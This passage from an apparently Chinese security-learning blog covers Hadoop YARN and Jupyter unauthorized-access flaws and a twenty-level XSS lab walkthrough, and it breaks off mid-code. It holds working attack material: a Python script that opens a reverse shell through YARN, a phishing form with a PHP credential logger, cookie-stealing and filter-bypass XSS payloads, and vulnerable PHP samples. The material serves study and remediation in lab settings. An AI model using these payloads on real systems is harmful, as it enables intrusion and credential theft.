<span class=\"string\">&#x27;ws/v1/cluster/apps/new-application&#x27;</span></span><br><span class=\"line\">resp = requests.post(url)</span><br><span class=\"line\">app_id = resp.json()[<span class=\"string\">&#x27;application-id&#x27;</span>]</span><br><span class=\"line\">url = target + <span class=\"string\">&#x27;ws/v1/cluster/apps&#x27;</span></span><br><span class=\"line\">data = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;application-id&#x27;</span>: app_id,</span><br><span class=\"line\">    <span class=\"string\">&#x27;application-name&#x27;</span>: <span class=\"string\">&#x27;get-shell&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;am-container-spec&#x27;</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;commands&#x27;</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;command&#x27;</span>: <span class=\"string\">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&#x27;</span> % lhost,</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"string\">&#x27;application-type&#x27;</span>: <span class=\"string\">&#x27;YARN&#x27;</span>,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">requests.post(url, json=data)</span><br></pre></td></tr></table></figure>\n\n<p>3、反弹shell</p>\n<p><img src=\"/images/Unauthorized/image-20200709140921090.png\" alt=\"image-20200709140921090\"></p>\n<h5 id=\"漏洞修复-12\"><a href=\"#漏洞修复-12\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、如无必要，关闭 Hadoop Web 管理页面</p>\n<p>2、开启身份验证，防止未经授权用户访问</p>\n<p>3、设置“安全组”访问控制策略，将 Hadoop 默认开放的多个端口对公网全部禁止或限制可信任的 IP 地址才能访问包括 50070 以及 WebUI 等相关端口。</p>\n<h4 id=\"Jupyter-Notebook-未授权访问\"><a href=\"#Jupyter-Notebook-未授权访问\" class=\"headerlink\" title=\"Jupyter Notebook 未授权访问\"></a>Jupyter Notebook 未授权访问</h4><h5 id=\"漏洞描述-13\"><a href=\"#漏洞描述-13\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>​        Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。<br>如果管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建一个console并执行任意Python代码和命令。</p>\n<h5 id=\"漏洞验证-13\"><a href=\"#漏洞验证-13\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h5><p>0、环境搭建</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> wget https://raw.githubusercontent.com/vulhub/vulhub/master/jupyter/notebook-rce/docker-compose.yml</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> docker-compose build &amp;&amp; docker-compose up -d</span></span><br><span class=\"line\">默认监听8888端口</span><br></pre></td></tr></table></figure>\n\n<p>1、未授权访问</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://172.16.144.139:8888/</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200709145828298.png\" alt=\"image-20200709145828298\"></p>\n<p>2、命令执行</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;172.16.144.139:8888&#x2F;terminals&#x2F;1</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200709145911206.png\" alt=\"image-20200709145911206\"></p>\n<h5 id=\"漏洞修复-13\"><a href=\"#漏洞修复-13\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、开启身份验证，防止未经授权用户访问</p>\n<p>2、访问控制策略，限制IP访问，绑定固定IP</p>\n<h4 id=\"监听端口\"><a href=\"#监听端口\" class=\"headerlink\" title=\"监听端口\"></a>监听端口</h4><p>以上未授权漏洞程序默认监听端口情况如下：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Reids\t: 6379</span><br><span class=\"line\">MongoDB : 27017</span><br><span class=\"line\">Jenkins : 8089</span><br><span class=\"line\">Memcached : 11211</span><br><span class=\"line\">JBoss\t:\t8080</span><br><span class=\"line\">VNC :\t5900、5901</span><br><span class=\"line\">Docker\t:\t2375</span><br><span class=\"line\">ZooKeeper : 2181</span><br><span class=\"line\">Rsync\t:\t837</span><br><span class=\"line\">Atlassian Crowd\t:\t8095</span><br><span class=\"line\">Couch DB\t:\t5984</span><br><span class=\"line\">ElasticSearch\t: 9200、9300</span><br><span class=\"line\">Hadoop\t:\t 8088</span><br><span class=\"line\">Jupyter Notebook\t:\t8888</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;6103#toc-4</span><br><span class=\"line\">https:&#x2F;&#x2F;paper.seebug.org&#x2F;409&#x2F;</span><br></pre></td></tr></table></figure>\n"},{"title":"XSS学习","date":"2020-09-05T12:26:23.000Z","_content":"\n### 漏洞概述\n\nXSS：“Cross Site Scripting”：“跨站脚本攻击”，因和CSS（层叠样式表重名），因此被命名为XSS来表示\"跨站脚本攻击\"。\n\n之前说到，既然出现安全问题，必然是外部用户输入恶意字符串而产生的（又可称为：攻击者对参数、输入点可控，同时服务器端对输入的值未经过滤、转义，导致攻击事件发生。）整体的安全事件必然也均这样的经过，漏洞如何`验证`、`影响范围`及`修复`需要我们慢慢学习整理。\n\n#### 原理\n\n因浏览器本身设计缺陷，而浏览器的主要工作是对用户请求的HTML+CSS+Javascript的解释执行，其以前部分浏览器在安全性这块并未做任何验证，导致服务器端对外提供访问后一旦部署相应应用系统，且未对用户提交数据进行过滤将产生XSS攻击。\n\n本质是客户端代码注入攻击，代码类型基本属于前端类：HTML、Javascript、CSS等其他脚本组成。\n\n#### 产生过程\n\n##### 反射型(非持久性)\n\n1. 攻击者构造出特殊代码，其中包含恶意代码\n2. 用户打开带有恶意代码URL或网页，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器\n3. 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行；会进行弹窗告警\n\n##### 存储型(持久性)\n\n1. 攻击者准备好接收Cookie平台\n2. 攻击者找到目标系统可留言、修改个人信息处\n3. 插入恶意代码及链接\n4. 管理员登录系统并对留言信息点击后会触发XSS漏洞\n5. 会把管理员登录的Cookie发送到接收平台\n6. 攻击者替换Cookie值进行访问，此时权限会提升至管理员\n\n##### DOM型\n\n1. 攻击者构造Javascript或其他脚本\n2. 插入到指定位置(URL参数、其他个人信息或其他可修改位置)\n3. 点击触发漏洞，构造的恶意代码被执行\n4. 结果：可能会弹窗或其他操作\n\n#### 漏洞分类\n\n由以上了解，漏洞可按照以下形式进行分类：\n\n##### 一、非持久型(反射型、DOM型)\n\n指不会一直影响系统，只有每次点击访问后会触发浏览器执行对应恶意代码并作出响应。\n\n##### 二、持久型(存储型)\n\n指会一直留存于对应应用系统内，且如不删除操作会预留至系统内；一旦点击后会触发恶意代码，而且如不删除会每次点击都会触发。\n\n### 漏洞环境\n\n值得推荐的本地漏洞环境可参考如下：\n\n````\nDVWA:https://github.com/digininja/DVWA.git\n本地搭建XSS:https://zhuanlan.zhihu.com/p/54041627\nbwapp:http://www.itsecgames.com/\n其他环境待更新...\n````\n\n### 在线挑战\n\n值得推荐的线上挑战赛：\n\n```\nhttps://xz.aliyun.com/t/2296\nhttps://xss-quiz.int21h.jp/\n其他环境待更新...\n```\n\n### 影响范围\n\n按不同类型分析对目标系统会产生哪些影响范围\n\n#### 反射型\n\nCookie欺骗/Cookie会话攻击（提前搭建接收Cookie文件）\n\nXSS History Hack(利用：getComputedStyle()方法)\n\n#### 存储型\n\nCookie欺骗/Cookie会话攻击\n\n会话劫持(Session/Cookie)\n\n网络钓鱼\n\n钓鱼脚本\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>login</title>\n</head>\n<body>\n    <form method=\"POST\" action=\"http://xss-lab.me:8888/get.php\">\n        <input type=\"text\" name=\"username\" value=\"test\"/><br>\n        <input type=\"password\" name=\"password\" value=\"Pass\"/><br>\n        <input type=\"submit\" name=\"login\" value=\"Submit\">\n    </form>\n</body>\n</html>\n```\n\n记录信息\n\n```php\n<?php\n$data =fopen('login.txt',\"a+\");\n$login = $_POST[\"username\"];\n$pass = $_POST[\"password\"];\nfwrite($data,\"username:$login\\n\");\nfwrite($data,\"password:$pass\\n\");\nfclose($data);\nHeader(\"location:login.html\");\n?>\n```\n\n下图记录用户提交请求\n\n![image-20200828105754440](/images/XSS/image-20200828105754440.png)\n\n网页挂马(网页内嵌入script、或iframe等标签)\n\nDOS或DDOS\n\n#### DOM型\n\nDOM型和反射型XSS类似因此不再重复写\n\n### 实战验证\n\n#### 反射型\n\n反射型XSS使用网络检索得到一款源码搭建本地测试，反射型`payload`\n\n##### 挑战一\n\n```shell\n//未编码\n`<script>alert('xss')</script>`\n```\n\n```shell\n<?php \nini_set(\"display_errors\", 0);\n//外部输入变量\n$str = $_GET[\"name\"];\n//变量值未经过滤直接输出\necho \"<h2 align=center>欢迎用户\".$str.\"</h2>\";\n?>\n<center><img src=level1.png></center>\n<?php \necho \"<h3 align=center>payload的长度:\".strlen($str).\"</h3>\";\n?>\n```\n\n`Result`\n\n![image-20200828134439412](/images/XSS/image-20200828134439412.png)\n\n##### 挑战二\n\n```shell\n//初步测试,发现payload直接输出\n`<script>alert('xss')</script>`\n```\n\n![image-20200828140956492](/images/XSS/image-20200828140956492.png)\n\n```shell\n//满足闭合,观察输入payload时输出\n`\"><script>alert('xss')</script>`\n```\n\n```shell\n//对变量经过htmlspecialchars函数过滤\n<?php \nini_et(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form action=level2.php method=GET>\n<input name=keyword  value=\"'.$str.'\">\n<input type=submit name=submit value=\"搜索\"/>\n</form>\n</center>';\n?>\n<center><img src=level2.png></center>\n<?php \necho \"<h3 align=center>payload的长度:\".strlen($str).\"</h3>\";\n?>\n```\n\n`Result`\n\n![image-20200828140717307](/images/XSS/image-20200828140717307.png)\n\n##### 挑战三\n\n```shell\n//闭合测试，发现>被转义了\n`><script>alert('xss')</script>`\n```\n\n![image-20200828142634784](/images/XSS/image-20200828142634784.png)\n\n```shell\n//不使用<等类似字符进行测试\n`'onmouseover=alert(1)//`\n```\n\n```shell\n//对变量经过两次htmlspecialchars函数过滤\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".\"<center>\n<form action=level3.php method=GET>\n<input name=keyword  value='\".htmlspecialchars($str).\"'>\n<input type=submit name=submit value=搜索 />\n</form>\n</center>\";\n?>\n```\n\n`Result`\n\n![image-20200828143012943](/images/XSS/image-20200828143012943.png)\n\n##### 挑战四\n\n```shell\n//基础测试，发现对<、>进行替换为空\n`\"><script>alert('xss')</script>`\n```\n\n![image-20200828143756092](/images/XSS/image-20200828143756092.png)\n\n```shell\n//不使用<等类似字符进行测试\n`\"onmouseover=alert(1)//`\n```\n\n```php+HTML\n//对输入变量值中<、>进行替换\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str2=str_replace(\">\",\"\",$str);\n$str3=str_replace(\"<\",\"\",$str2);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form action=level4.php method=GET>\n<input name=keyword  value=\"'.$str3.'\">\n<input type=submit name=submit value=搜索 />\n</form>\n</center>';\n?>\n```\n\n`Result`\n\n![image-20200828144232008](/images/XSS/image-20200828144232008.png)\n\n##### 挑战五\n\n```shell\n//基础测试，发现对<、>进行替换为空\n`\"><script>alert('xss')</script>`\n```\n\n![image-20200828150406623](/images/XSS/image-20200828150406623.png)\n\n```php+HTML\n//<script 转换成 <scr_ipt ，on转换成 o_n\n<?php \nini_set(\"display_errors\", 0);\n$str = strtolower($_GET[\"keyword\"]);\n$str2=str_replace(\"<script\",\"<scr_ipt\",$str);\n$str3=str_replace(\"on\",\"o_n\",$str2);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form action=level5.php method=GET>\n<input name=keyword  value=\"'.$str3.'\">\n<input type=submit name=submit value=搜索 />\n</form>\n</center>';\n?>\n```\n\n```shell\n//使用伪协议绕过\n`\"> <a href=\"javascript:alert(1)\">click</a>`\n```\n\n`Result`\n\n![image-20200828151240091](/images/XSS/image-20200828151240091.png)\n\n##### 挑战六\n\n```shell\n//使用伪协议绕过\n`\"> <a href=\"javascript:alert(1)\">click</a>`\n```\n\n![image-20200828151906636](/images/XSS/image-20200828151906636.png)\n\n````php+HTML\n//发现添加了多个属性进行过滤操作\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str2=str_replace(\"<script\",\"<scr_ipt\",$str);\n$str3=str_replace(\"on\",\"o_n\",$str2);\n$str4=str_replace(\"src\",\"sr_c\",$str3);\n$str5=str_replace(\"data\",\"da_ta\",$str4);\n$str6=str_replace(\"href\",\"hr_ef\",$str5);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form action=level6.php method=GET>\n<input name=keyword  value=\"'.$str6.'\">\n<input type=submit name=submit value=搜索 />\n</form>\n</center>';\n?>\n````\n\n```shell\n//发现并未对大小写过滤，\n`\"> <a HrEf=\"javascript:alert(1)\">click</a>`\n```\n\n`Result`\n\n![image-20200828152455501](/images/XSS/image-20200828152455501.png)\n\n##### 挑战七\n\n```shell\n//使用大小写测试\n`\"> <a HrEf=\"javascript:alert(1)\">click</a>`\n```\n\n![image-20200828152734820](/images/XSS/image-20200828152734820.png)\n\n```php+HTML\n//添加script替换为空\n<?php \nini_set(\"display_errors\", 0);\n$str =strtolower( $_GET[\"keyword\"]);\n$str2=str_replace(\"script\",\"\",$str);\n$str3=str_replace(\"on\",\"\",$str2);\n$str4=str_replace(\"src\",\"\",$str3);\n$str5=str_replace(\"data\",\"\",$str4);\n$str6=str_replace(\"href\",\"\",$str5);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form action=level7.php method=GET>\n<input name=keyword  value=\"'.$str6.'\">\n<input type=submit name=submit value=搜索 />\n</form>\n</center>';\n?>\n```\n\n```shell\n//重复绕过,\n`\"><sscriptcript>alert(1)</sscriptcript>`\n`\"oonnmouseover=alert(1)`\n`\"><a hrhrefef=javascriscriptpt:alert(1)>click</a>`\n```\n\n`Result`\n\n![image-20200828153152250](/images/XSS/image-20200828153152250.png)\n\n##### 挑战八\n\n````shell\n//重复测试\n`\"><sscriptcript>alert(1)</sscriptcript>`\n````\n\n![image-20200828153930815](/images/XSS/image-20200828153930815.png)\n\n```php+HTML\n//在上面基础上添加了大小写过滤、属性中双引号被转换成HTML实体，无法截断属性，可以使用协议绕过javascript:alert，由于script关键字被过滤，\n<?php \nini_set(\"display_errors\", 0);\n$str = strtolower($_GET[\"keyword\"]);\n$str2=str_replace(\"script\",\"scr_ipt\",$str);\n$str3=str_replace(\"on\",\"o_n\",$str2);\n$str4=str_replace(\"src\",\"sr_c\",$str3);\n$str5=str_replace(\"data\",\"da_ta\",$str4);\n$str6=str_replace(\"href\",\"hr_ef\",$str5);\n$str7=str_replace('\"','&quot',$str6);\necho '<center>\n<form action=level8.php method=GET>\n<input name=keyword  value=\"'.htmlspecialchars($str).'\">\n<input type=submit name=submit value=添加友情链接 />\n</form>\n</center>';\n?>\n```\n\n[在线实体编码](https://www.qqxiuzi.cn/bianma/zifushiti.php)\n\n```shell\n//实体编码，javascript会被替换成javasc_rpt，我们使用&#x72来代替r ,HTML字符实体转换：\n`javascrip&#x74;:alert(1)`\n`javascript:%61lert(1)`\n`javasc&#x72;ipt:alert`1``\n`javasc&#x0072;ipt:alert`1``\n```\n\n`Result`\n\n![image-20200828154518631](/images/XSS/image-20200828154518631.png)\n\n##### 挑战九\n\n```shell\n//实体编码测试\n`javascrip&#x74;:alert(1)`\n```\n\n![image-20200828154756855](/images/XSS/image-20200828154756855.png)\n\n```php+HTML\n//在之前基础上，添加的链接是http://头信息\n<?php \nini_set(\"display_errors\", 0);\n$str = strtolower($_GET[\"keyword\"]);\n$str2=str_replace(\"script\",\"scr_ipt\",$str);\n$str3=str_replace(\"on\",\"o_n\",$str2);\n$str4=str_replace(\"src\",\"sr_c\",$str3);\n$str5=str_replace(\"data\",\"da_ta\",$str4);\n$str6=str_replace(\"href\",\"hr_ef\",$str5);\n$str7=str_replace('\"','&quot',$str6);\necho '<center>\n<form action=level9.php method=GET>\n<input name=keyword  value=\"'.htmlspecialchars($str).'\">\n<input type=submit name=submit value=添加友情链接 />\n</form>\n</center>';\n?>\n<?php\nif(false===strpos($str7,'http://'))\n{\n  echo '<center><BR><a href=\"您的链接不合法？有没有！\">友情链接</a></center>';\n        }\nelse\n{\n  echo '<center><BR><a href=\"'.$str7.'\">友情链接</a></center>';\n}\n?>\n```\n\n```shell\n//添加http://信息\n`javascrip&#x74;:alert(1)//http://xxx.com ` //利用注释\n`javascrip&#x74;:%0dhttp://xxx.com%0dalert(1) ` //不利用注释\n`javascrip&#x74;:%0ahttp://xxx.com%0daalert(1)`  //不利用注释\n```\n\n`Result`\n\n![image-20200828155322234](/images/XSS/image-20200828155322234.png)\n\n##### 挑战十\n\n发现一个隐藏输入框\n\n![image-20200828155806918](/images/XSS/image-20200828155806918.png)\n\n```php+HTML\n//多了个参数、多了一个输入框且已经隐藏、并对<、>括号进行过滤，htmlspecialchars函数过滤\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str11 = $_GET[\"t_sort\"];\n$str22=str_replace(\">\",\"\",$str11);\n$str33=str_replace(\"<\",\"\",$str22);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form id=search>\n<input name=\"t_link\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_history\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_sort\"  value=\"'.$str33.'\" type=\"hidden\">\n</form>\n</center>';\n?>\n```\n\n```shell\n//添加参数并构造PoC\n`keyword = test&t_sort=\"type=\"text\" onclick = \"alert(1)`\n`keyword = test&t_sort=\"type=\"text\" onmouseover=\"alert(1)`\n`keyword = test&t_sort=\"type=\"text\" onmouseover=alert`1``\n```\n\n`Result`\n\n![image-20200828160245970](/images/XSS/image-20200828160245970.png)\n\n##### 挑战十一\n\n之前测试发现无效果，查看源码\n\n```javascript\n//比之前多了个请求头REFERER进行指定来源\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str00 = $_GET[\"t_sort\"];\n$str11=$_SERVER['HTTP_REFERER'];\n$str22=str_replace(\">\",\"\",$str11);\n$str33=str_replace(\"<\",\"\",$str22);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form id=search>\n<input name=\"t_link\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_history\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_sort\"  value=\"'.htmlspecialchars($str00).'\" type=\"hidden\">\n<input name=\"t_ref\"  value=\"'.$str33.'\" type=\"hidden\">\n</form>\n</center>';\n?>\n```\n\n````shell\n//修改请求头并修改一下PoC代码\n`Referer: \" onmouseover=alert(1) type=\"text\"`\n`Referer: \" onclick=\"alert(1) type=\"text\"`\n````\n\n![image-20200828161500548](/images/XSS/image-20200828161500548.png)\n\n`Result`\n\n![image-20200828161534239](/images/XSS/image-20200828161534239.png)\n\n##### 挑战十二\n\n```javascript\n//不再是REFERER请求头，现在更换了User-agent\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str00 = $_GET[\"t_sort\"];\n$str11=$_SERVER['HTTP_USER_AGENT'];\n$str22=str_replace(\">\",\"\",$str11);\n$str33=str_replace(\"<\",\"\",$str22);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form id=search>\n<input name=\"t_link\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_history\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_sort\"  value=\"'.htmlspecialchars($str00).'\" type=\"hidden\">\n<input name=\"t_ua\"  value=\"'.$str33.'\" type=\"hidden\">\n</form>\n</center>';\n?>\n```\n\n````shell\n//修改User-agent插入PoC\n`User-Agent: \" onmouseover=alert(1) type=\"text\"`\n`User-Agent: \" onclick=\"alert(1) type=\"text\"`\n````\n\n![image-20200828162042253](/images/XSS/image-20200828162042253.png)\n\n`Result`\n\n![image-20200828162112961](/images/XSS/image-20200828162112961.png)\n\n##### 挑战十三\n\n```php+HTML\n//修改请求头Cookie来测试\n<?php \nsetcookie(\"user\", \"call me maybe?\", time()+3600);\nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str00 = $_GET[\"t_sort\"];\n$str11=$_COOKIE[\"user\"];\n$str22=str_replace(\">\",\"\",$str11);\n$str33=str_replace(\"<\",\"\",$str22);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form id=search>\n<input name=\"t_link\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_history\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_sort\"  value=\"'.htmlspecialchars($str00).'\" type=\"hidden\">\n<input name=\"t_cook\"  value=\"'.$str33.'\" type=\"hidden\">\n</form>\n</center>';\n?>\n```\n\n```shell\n//修改Cookie\n`Cookie: user=call+me+maybe%3F\" onmouseover=alert(1) type=\"text\"`\n`Cookie: user=call+me+maybe%3F\" onclick=\"alert(1) type=\"text\"`\n```\n\n![image-20200828162907084](/images/XSS/image-20200828162907084.png)\n\n`Result`\n\n![image-20200828162927276](/images/XSS/image-20200828162927276.png)\n\n##### 挑战十四\n\n网路搜索：\n\n`此题主要利用exif xss，链接由于网络的原因无法访问，exif xss，一般利用于文件上传的地方，最经典的就是头像上传，上传一个图片，该图片的exif元数据被修改为xss payload，成功利用弹窗，可利用exiftool工具，命令如下：`\n\n```shell\n//但是因为域名无法访问了，这题后期再更\n`exiftool -FIELD=XSS FILENAME`\n`exiftool -Artist=' \"><img src=1 onerror=alert(document.domain)>' filename.jpeg`\n```\n\n##### 挑战十五\n\n```php+HTML\n//ng-include是AngularJS中指令，具有文件包含功能\"<div ng-include=\"'myFile.htm'\"></div>\n\"，和php中include函数类似。可通过src属性来加载以上是挑战任意一个。\n//这里需要注意，其中远程加载google的js，需要\"扶梯子\"才行。\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"src\"];\necho '<body><span class=\"ng-include:'.htmlspecialchars($str).'\"></span></body>';\n?>\n```\n\n```shell\n//这里包含挑战二来实现XSS\n`/level15.php?src='level2.php?keyword=\"><img src=x onerror=alert(1)>'`\n```\n\n`Result`\n\n![image-20200828200852458](/images/XSS/image-20200828200852458.png)\n\n##### 挑战十六\n\n```php+HTML\n//对变量的值进行script、/、空格等替换&nbsp，用%0d，%0a等绕过\n<?php \nini_set(\"display_errors\", 0);\n$str = strtolower($_GET[\"keyword\"]);\n$str2=str_replace(\"script\",\"&nbsp;\",$str);\n$str3=str_replace(\" \",\"&nbsp;\",$str2);\n$str4=str_replace(\"/\",\"&nbsp;\",$str3);\n$str5=str_replace(\"\t\",\"&nbsp;\",$str4);\necho \"<center>\".$str5.\"</center>\";\n?>\n<center><img src=level16.png></center>\n<?php \necho \"<h3 align=center>payload的长度:\".strlen($str5).\"</h3>\";\n?>\n```\n\n```shell\n//对字符进行编码\n`<img%0dsrc=1%0donerror=alert(16)>`\n`<iframe%0dsrc=0%0donmouseover=alert｀16｀></iframe>`\n`<svg%0aonload=alert｀16｀></svg>`\n```\n\n`Result`\n\n![image-20200828203522683](/images/XSS/image-20200828203522683.png)\n\n##### 挑战十七\n\n```php+HTML\n//加载swf文件，并对两个参数arg01和arg02值进行过滤\n<?php\nini_set(\"display_errors\", 0);\necho \"<embed src=xsf01.swf?\".htmlspecialchars($_GET[\"arg01\"]).\"=\".htmlspecialchars($_GET[\"arg02\"]).\" width=100% heigth=100%>\";\n?>\n```\n\n```shell\n//使用编码%0a、%0b绕过。\n`arg01=123&arg02= onmouseover=alert(1)`\n`arg01=123&arg02=%20onmousedown=alert`1``\n`arg01=123&arg02=  onmouseover=alert(1) type=\"text\"`\n``/level17.php?arg01=a&arg02=%20onmouseover=alert`1``\n```\n\n`Result`\n\n![image-20200828220707491](/images/XSS/image-20200828220707491.png)\n\n##### 挑战十八\n\n````php+HTML\n//和挑战十七的试题一致，可直接拿来利用测试\n<?php\nini_set(\"display_errors\", 0);\necho \"<embed src=xsf02.swf?\".htmlspecialchars($_GET[\"arg01\"]).\"=\".htmlspecialchars($_GET[\"arg02\"]).\" width=100% heigth=100%>\";\n?>\n````\n\n```shell\n//使用编码%0a、%0b绕过。\n`arg01=123&arg02= onmouseover=alert(1)`\n`arg01=123&arg02=%20onmousedown=alert`1``\n`arg01=123&arg02=  onmouseover=alert(1) type=\"text\"`\n`/level17.php?arg01=a&arg02=%20onmouseover=alert`1``\n```\n\n`Result`\n\n![image-20200829095926257](/images/XSS/image-20200829095926257.png)\n\n##### 挑战十九\n\n````php+HTML\n//此题主要介绍考察Flash XSS\n<?php\nini_set(\"display_errors\", 0);\necho '<embed src=\"xsf03.swf?'.htmlspecialchars($_GET[\"arg01\"]).\"=\".htmlspecialchars($_GET[\"arg02\"]).'\" width=100% heigth=100%>';\n?>\n````\n\n直接访问URL\n\n```\nhttp://xss-lab.me:8888/level19.php?arg01=a&arg02=b\n```\n\n![image-20200829104903728](/images/XSS/image-20200829104903728.png)\n\nswf文件直接输出参数值\n\n````shell\n//使用a标签加载javascript协议弹窗\n`/level19.php?arg01=version&arg02=<a href=\"javascript:alert('XSS')\">XSS_Click</a>`\n````\n\n![image-20200829105426617](/images/XSS/image-20200829105426617.png)\n\n点击触发漏洞\n\n`Result`\n\n![image-20200829105522767](/images/XSS/image-20200829105522767.png)\n\n##### 挑战二十\n\n```php+HTML\n//网络搜索未找到对应解析此题，只知道此题还是Flash XSS。\n<?php\nini_set(\"display_errors\", 0);\necho '<embed src=\"xsf04.swf?'.htmlspecialchars($_GET[\"arg01\"]).\"=\".htmlspecialchars($_GET[\"arg02\"]).'\" width=100% heigth=100%>';\n?>\n```\n\n`payload`\n\n```shell\n//使用以下payload可实现，备注参数arg01的值必须是id不然都不弹窗；不理解其意；\n`level20.php?arg01=id&arg02=\\\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//%26width%26height`\n```\n\n`Result`\n\n![image-20200829135137358](/images/XSS/image-20200829135137358.png)\n\n参考以上学习可简单了解XSS反射型，但如想继续研究建议可网络搜索在线挑战并练习或参考网上Writeup。\n\n#### 存储型\n\n存储型XSS  是指应用程序通过Web请求获取不可信赖的数据，在未检验数据是否存在XSS代码的情况下，便将其存入数据库。当下一次从数据库中获取该数据时程序也未对其进行过滤，页面再次执行XSS代码，存储型XSS可以持续攻击用户。存储型XSS漏洞大多出现在留言板、评论区，用户提交了包含XSS代码的留言到数据库。当目标用户查询留言时，那些留言的内容会从服务器解析之后加载出来。浏览器发现有XSS代码，就当做正常的HTML和JS解析执行，存储型XSS就发生了。\n\n存储型XSS攻击方式主要是嵌入一段远程或者第三方域上的JS代码，并在目标域执行这些代码。存储型XSS会造成Cookie泄露，破坏页面正常的结构与样式，重定向访问恶意网站等。\n\n##### 搭建接收平台\n\n参考下面的`cookie.php`文件获取网站cookie方式；保存单文件至当前文件夹内；也可以使用互联网上的接收平台[XSS_Top](https://webxss.top/)\n\n##### 实战\n\n###### DVWA-low\n\n看到输入框长度有限制，这里可以通过修改JS，或者使用Burpsuite来实现。\n\n![image-20200831171126727](/images/XSS/image-20200831171126727.png)\n\n```php+HTML\nDVWA-Low\n<?php\nif( isset( $_POST[ 'btnSign' ] ) ) {\n\t// Get input\n\t$message = trim( $_POST[ 'mtxMessage' ] );\n\t$name    = trim( $_POST[ 'txtName' ] );\n\t// Sanitize message input\n\t$message = stripslashes( $message );\n\t$message = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $message ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not 